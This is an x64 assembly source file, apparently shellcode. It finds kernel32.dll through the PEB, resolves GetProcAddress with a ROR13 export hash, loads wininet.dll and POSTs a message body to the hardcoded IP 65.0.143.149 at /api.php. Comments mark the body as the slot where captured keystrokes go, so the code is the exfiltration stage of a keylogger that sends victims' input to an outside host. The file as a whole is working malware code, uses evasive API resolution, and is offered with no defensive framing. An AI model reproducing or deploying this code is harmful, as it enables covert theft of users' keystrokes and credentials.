

.code
main PROC
	
	MOV RAX, GS:[60h]		; For Base PEB GS:[60h] points to PEB 
	MOV RAX, [RAX + 18h]	; 18h (For offset till PPEB_LDR_DATA)
	MOV RAX, [RAX + 20h]	; Pointing at the Flink of the InOrderMemoryList
	MOV RAX, [RAX]			; Hopping to ntdll.dll
	MOV RAX, [RAX]			; Hopping to kernel32.dll
	MOV RAX, [RAX + 20h]	; Moving to the base address of kernel32.dll

	; Now at kernel32.dll

	MOV RBX, RAX			; Fixed Base Address of Kernel32.dll
	MOV EAX, [RAX + 3Ch]	; Taking offset from e_lfanew
	LEA RAX, [RBX + RAX]	; Adding offset to Base Address to get to the NT Headers
	MOV ECX, [RAX + 88h]	; Beginning of the Data Directory
	LEA RAX, [RBX + RCX]	; Going to the address of the Export Address Table
	
	MOV EDX, [RAX + 20h]	; Address of names array
	MOV ECX, [RAX + 24h]	; Address of Ordinals array
	LEA RCX, [RBX + RCX]	; Pointer to that RVA Ordinal array
	LEA RDX, [RBX + RDX]	; Pointer to that RVA Names array 
	
	MOV R15D, [RAX + 18h]	; Total Number of names
	SHL R15D, 2				; Multiplying by 4
	MOV R14D, 7C0DFCAAh		; Precalculated Hash
	MOV R9, 0				; Basically an Iterator
	XOR R10, R10			; Clearing R10 register
	
	STR_FINDING_START:

		CMP R9, R15			; Making Sure we don't over shoot the limit
		JZ STR_FINDING_END	; Jumping to end so we don't read illegal memory
		MOV R8D, [RDX+R9]	; Getting the RVA to the string
		LEA R8, [R8+RBX]	; Going to memory location of string
		XOR R11, R11		; Clearing R11 register			
		
		ROR13_START:

			MOV R10B, [R8]		; Moving the first byte of a 64 bit into R10B
			CMP R10B, 0h		; Comparing with null byte [string End]
			JZ ROR13_END		; If NULL jump, exit

			ROR R11D, 13		; ROR 13 -> SHR 13, SHL19
			ADD R11D, R10D		; Add Rotation to create a hash

			INC R8				; Inc R8 to move 1 byte forward
			JMP ROR13_START		; Jump back to start

		ROR13_END:

		CMP R14, R11		; Comparing if we found GetProcAddress
		JZ STR_CONTINUE		; If found we can continue
		ADD R9, 4			; Moving onto next RVA
		JMP STR_FINDING_START

	STR_FINDING_END:
	; Crash here

	STR_CONTINUE:			; If found we continue
	; As the ordinal array has 2 byte width, and R9 is our iterator
	; We simply divide it by 2 to get correct number of bytes to move by
	SHR R9, 1				; Dividing by 2
	XOR R10, R10			; Clearing R10
	MOV R10W, [RCX + R9]	; Getting value at that addr., 2 byte value
	SHL R10, 2				; Multiplying by 4, as addr. of func. holds RVAs 
	MOV EDX, [RAX + 1Ch]	; Addr. Of func. array RVA
	LEA	RDX, [RBX + RDX]	; Going to RVA location, i.e addr. of func. array
	MOV R8D, [RDX + R10]	; Moving to GetProcAddress function RVA
	LEA R14, [RBX + R8]		; Finally going to function

	AND RSP, -16			; Forcing alignment of RSP to 16 bytes.
	MOV R12, 0000000041797261h
	PUSH R12 				; Ending of "LoadLibraryA"
	MOV R12, 7262694C64616F4Ch
	PUSH R12 				; Start of "LoadLibraryA"
	MOV RCX, RBX			; 1st Arg, Base address of Kernel32.dll
	MOV RDX, RSP			; 2st Arg, Pointer to LoadLibraryA string

	SUB RSP, 20h			; 32 bytes of shadow space
	CALL R14				; Calling GetProcAddress func. on LoadLibraryA
	; RAX now hold a func. pointer to LoadLibraryA
	ADD RSP, 30h			; Removing shadow space and removing the string from stack

	MOV R13, RAX			; LoadLibraryA Addr

	MOV RAX, 00000000006C6C64h
	PUSH RAX				; Ending of "wininet.dll"
	MOV RAX, 2E74656E696E6977h
	PUSH RAX				; Beginning of "wininet.dll"
	MOV RCX, RSP			; Pointer to string
	SUB RSP, 20h			; Adding shadow space
	CALL R13				; Calling LoadLibraryA
	ADD RSP, 30h			; Removing shadow space + string

	MOV RBX, RAX			; Saving wininet.dll base address

		;HINTERNET InternetOpenA(
	;	LPCSTR lpszAgent,       // Arg 1: User-Agent String ("Mozilla/5.0")
	;	DWORD  dwAccessType,    // Arg 2: Connection Type (1 = Direct, No Proxy)
	;	LPCSTR lpszProxy,       // Arg 3: Proxy Name (NULL)
	;	LPCSTR lpszProxyBypass, // Arg 4: Proxy Bypass List (NULL)
	;	DWORD  dwFlags          // Arg 5: Options (0) -> ON STACK
	;	)

	MOV RAX, 000000416E65704Fh
	PUSH RAX				; Pushing ending of InternetOpenA
	MOV RAX, 74656E7265746E49h
	PUSH RAX				; Pushing beginning of InternetOpenA
	MOV RCX, RBX			; 1st Arg, Base of Wininet.dll
	MOV RDX, RSP			; 2nd Arg, Pointer to string
	SUB RSP, 20h			; Shadow space
	CALL R14				; Finding func. addr. of InternetOpenA inside wininet.dll
	ADD RSP, 30h			; Removing shadow space + string
	MOV R13, RAX			; Saving func. addr. of InternetOpenA & Overwriting LoadLibraryA
	
	MOV RAX, 0000000000302E35h
	PUSH RAX				; Pushing ending of Mozilla/5.0
	MOV RAX, 2F616C6C697A6F4Dh
	PUSH RAX				; Pushing starting of Mozilla/5.0
	MOV RCX, RSP			; 1st Arg, String name
	MOV RDX, 1				; 2nd Arg, Connection type
	MOV R8, 00h				; 3rd Arg, No proxy name
	MOV R9, 00h				; 4th Arg, No Proxy Bypass List
	PUSH R9					; 8 byte padding to reach 16 byte alignment 
	PUSH R9					; 5th Arg, No option, Pushed onto stack
	SUB RSP, 20h			; Adding shadow space
	CALL R13				; Calling function InternetOpenA
	ADD RSP, 40h			; Removing all the variables and cleaning the stack

	;HINTERNET InternetConnectA(
	;  HINTERNET     hInternet,  // Arg 1 (RCX): Handle from InternetOpenA
	;  LPCSTR        lpszServer, // Arg 2 (RDX): IP Address String
	;  INTERNET_PORT nServerPort,// Arg 3 (R8):  Port (80)
	;  LPCSTR        lpszUserName,// Arg 4 (R9):  NULL
	;  LPCSTR        lpszPassword,// Arg 5 (Stack): NULL
	;  DWORD         dwService,  // Arg 6 (Stack): 3 (INTERNET_SERVICE_HTTP)
	;  DWORD         dwFlags,    // Arg 7 (Stack): 0
	;  DWORD_PTR     dwContext   // Arg 8 (Stack): 0
	;);
	
	MOV R15, RAX			; Saving handle of InternetOpenA root object

	MOV RAX, 0000000000000000h
	PUSH RAX				; Pushing Null Character
	MOV RAX, 417463656E6E6F43h
	PUSH RAX				; Pushing ending of InternetConnectA
	MOV RAX, 74656E7265746E49h
	PUSH RAX				; Pushing beginning of InternetConnectA
	MOV RCX, RBX			; 1st Arg, Base of Wininet.dll
	MOV RDX, RSP			; 2nd Arg, Pointer to string
	SUB RSP, 28h			; Shadow space + 8 byte padding
	CALL R14				; Finding func. addr. of InternetConnectA inside wininet.dll
	ADD RSP, 40h			; Removing shadow space + string
	MOV R13, RAX			; Saving func. addr. of InternetConnectA & Overwriting InternetOpenA


	MOV RCX, R15			; 1st Arg, Handle from InternetOpenA
	MOV RAX, 000000003934312Eh
	PUSH RAX				; Pushing end of 65.0.143.149
	MOV RAX, 3334312E302E3536h
	PUSH RAX
	MOV RDX, RSP			; 2nd Arg, pointer to IP addr. string
	MOV R8, 80				; 3rd Arg, Port number
	XOR R9, R9				; 4th Arg, UserName which is NULL
	PUSH R9					; 8th Arg, Context pushed onto stack
	PUSH R9					; 7th Arg, Flags something keep as 0, pushed onto stack
	MOV RAX, 3
	PUSH RAX				; 6th Arg, 3 for HTTP protocol, Pushed onto stack
	PUSH R9					; 5th Arg, Password which is none, Pushed onto stack
	SUB RSP, 20h			; Adding shadow space 
	CALL R13
	ADD RSP, 50h			; Removing shadow space + variables

	;HINTERNET HttpOpenRequestA(
	;  HINTERNET hConnect,        // Arg 1: Connection Handle (from InternetConnectA)
	;  LPCSTR    lpszVerb,        // Arg 2: "GET" or "POST"
	;  LPCSTR    lpszObjectName,  // Arg 3: Path to file (e.g., "/login.php")
	;  LPCSTR    lpszVersion,     // Arg 4: HTTP Version (NULL = HTTP/1.1)
	;  LPCSTR    lpszReferrer,    // Arg 5 (Stack): Referrer URL (NULL)
	;  LPCSTR    *lplpszAcceptTypes, // Arg 6 (Stack): Content types accepted (NULL)
	;  DWORD     dwFlags,         // Arg 7 (Stack): Options (0x80000000 = RELOAD)
	;  DWORD_PTR dwContext        // Arg 8 (Stack): User defined ID (0)
	;);

	MOV RDI, RAX			; Saving handle of the InternetConnectA object

	MOV RAX, 0000000000000000h
	PUSH RAX				; Pushing Null Character
	MOV RAX, 4174736575716552h
	PUSH RAX				; Pushing ending of HttpOpenRequestA
	MOV RAX, 6E65704F70747448h
	PUSH RAX				; Pushing beginning of HttpOpenRequestA
	MOV RCX, RBX			; 1st Arg, Base of Wininet.dll
	MOV RDX, RSP			; 2nd Arg, Pointer to string
	SUB RSP, 28h			; Shadow space + 8 byte padding
	CALL R14				; Finding func. addr. of HttpOpenRequestA inside wininet.dll
	ADD RSP, 40h			; Removing shadow space + string
	MOV R13, RAX			; Saving func. addr. of HttpOpenRequestA & Overwriting InternetConnectA

	MOV RCX, RDI			; 1st Arg, Handle from InternetOpenA
	MOV RAX, 0000000054534F50h
	PUSH RAX				; Pushing "POST" onto Stack
	MOV RDX, RSP			; 2nd Arg, pointer to IP addr. string
	MOV RAX, 0000000000000000h
	PUSH RAX				; Pushing Null Character onto stack
	MOV RAX, 7068702E6970612Fh
	PUSH RAX				; Pushing "/api.php" onto stack
	MOV R8, RSP				; 3rd Arg, Pointer to "/api.php"
	; HTTP version, NULL means use default which is HTTP/1.1
	XOR R9, R9				; 4th Arg, We can leave as NULL
	PUSH R9					; 8th Arg, Context, leave as null, pushed onto stack
	; Flag we need to keep as 80000000h as it has something to do with caching, I didn't look into it
	MOV RAX, 80000000h
	PUSH RAX				; 7th Arg, pushed onto stack
	; Content types accepted means what we can accept ourselves, since we don't need anything, NULL
	PUSH R9					; 6th Arg, leave as NULL, Pushed onto stack
	; Referer basically means where you come from like I came from https://google.com or something
	PUSH R9					; 5th Arg, Push NULL, Pushed onto stack
	SUB RSP, 28h			; Adding shadow space + 8 Byte padding
	CALL R13
	ADD RSP, 60h			; Removing shadow space + variables

	; =========================================================================
	; BOOL HttpSendRequestA(
	;   HINTERNET hRequest,      // Arg 1 (RCX): Handle from HttpOpenRequestA
	;   LPCSTR    lpszHeaders,   // Arg 2 (RDX): "Content-Type: application/x-www-form-urlencoded"
	;   DWORD     dwHeadersLength, // Arg 3 (R8):  -1 (Let WinINet calculate length)
	;   LPVOID    lpOptional,    // Arg 4 (R9):  Pointer to Body ("msg=Hello World")
	;   DWORD     dwOptionalLength // Arg 5 (Stack): 15 (Length of Body)
	; );
	; =========================================================================

	MOV RDI, RAX			; Saving handle from the HttpOpenRequestA object

	MOV RAX, 0000000000000000h
	PUSH RAX				; Pushing Null Character
	MOV RAX, 4174736575716552h
	PUSH RAX				; Pushing ending of HttpSendRequestA
	MOV RAX, 646E655370747448h
	PUSH RAX				; Pushing beginning of HttpSendRequestA
	MOV RCX, RBX			; 1st Arg, Base of Wininet.dll
	MOV RDX, RSP			; 2nd Arg, Pointer to string
	SUB RSP, 28h			; Shadow space + 8 byte padding
	CALL R14				; Finding func. addr. of HttpSendRequestA inside wininet.dll
	ADD RSP, 40h			; Removing shadow space + string
	MOV R13, RAX			; Saving func. addr. of HttpSendRequestA & Overwriting HttpOpenRequestA 

	MOV RCX, RDI			; 1st Arg, Handle of HttpOpenRequestA object
	MOV RAX, 006465646F636E65h
	PUSH RAX				; Beginning of "Content-Type: application/x-www-form-urlencoded"
	MOV RAX, 6C72752D6D726F66h
	PUSH RAX				; Pushing "Content-Type..."
	MOV RAX, 2D7777772D782F6Eh
	PUSH RAX				; Pushing "Content-Type..."
	MOV RAX, 6F69746163696C70h
	PUSH RAX				; Pushing "Content-Type..."
	MOV RAX, 7061203A65707954h
	PUSH RAX				; Pushing "Content-Type..."
	MOV RAX, 2D746E65746E6F43h
	PUSH RAX				; Pushing starting of "Content-Type..."
	; 30h Offset till here on stack
	MOV RDX, RSP			; 2nd Arg, Content Type String pointer
	MOV R8, -1				; 3rd Arg, -1 lets library calculate length on it's own
	MOV RAX, 0000000000000000h
	PUSH RAX				; DO NO TOUCH THIS"
;
;
;		INSERT DATA INTO BELOW REGISTERS ONLY
;
;
	MOV RAX, 2D2D415441445452h
	PUSH RAX				; INSERT KEYSTROES HERE"
	MOV RAX, 45534E493D67736Dh
	PUSH RAX				; AND HERE"
;
;
;		INSERT DATA INTO ABOVE REGISTERS ONLY
;
;
	; 48h Offset on stack till here
	MOV R9, RSP				; 4th Arg, Pointer to message body string
	MOV RAX, 18				; Length of message body
	PUSH RAX				; 5th Arg, Length of message body string, on stack
	; 50h Offset till here on stack
	SUB RSP, 20h			; Adding shadow space
	CALL R13
	ADD RSP, 70h

	JMP $					; Hanging program



main ENDP
END